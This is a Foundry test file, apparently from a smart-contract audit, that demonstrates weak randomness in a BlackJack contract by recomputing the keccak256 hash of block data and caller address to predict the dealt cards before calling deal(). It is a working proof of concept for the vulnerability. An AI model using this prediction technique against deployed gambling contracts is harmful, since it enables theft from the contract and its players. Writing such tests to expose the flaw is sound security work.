
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BlackJack, Deck} from "../src/BlackJack.sol";

contract TestWeakRandomnessBlackJack is Test {
    BlackJack blackjack;

    function setUp() public {
        blackjack = new BlackJack();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber, uint256 blockTimestamp) public {
        // --- 1. Constraints ---
        vm.assume(blockNumber > 0 && blockNumber < type(uint256).max - 100);
        vm.assume(blockTimestamp > 0 && blockTimestamp < type(uint256).max - 100);

        // --- 2. State Configuration ---
        vm.deal(address(this), 10 ether);

        // Manipulate block environment
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // --- 3. Replication & Assertion ---
        // Predict the three cards that will be dealt in deal()
        uint8 predictedPlayer0 = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number),
                        address(this),
                        uint8(0),
                        block.timestamp
                    )
                )
            ) % 52
        );

        uint8 predictedHouse0 = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number),
                        address(this),
                        uint8(1),
                        block.timestamp
                    )
                )
            ) % 52
        );

        uint8 predictedPlayer1 = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number),
                        address(this),
                        uint8(2),
                        block.timestamp
                    )
                )
            ) % 52
        );

        // Execute the vulnerable function
        blackjack.deal{value: blackjack.minBet()}();

        // Assert that we can perfectly predict the "random" cards
        uint8 onchainPlayer0 = blackjack.getPlayerCard(0);
        uint8 onchainHouse0 = blackjack.getHouseCard(0);
        uint8 onchainPlayer1 = blackjack.getPlayerCard(1);

        assertEq(onchainPlayer0, predictedPlayer0, "player first card predictable");
        assertEq(onchainHouse0, predictedHouse0, "house first card predictable");
        assertEq(onchainPlayer1, predictedPlayer1, "player second card predictable");
    }
}
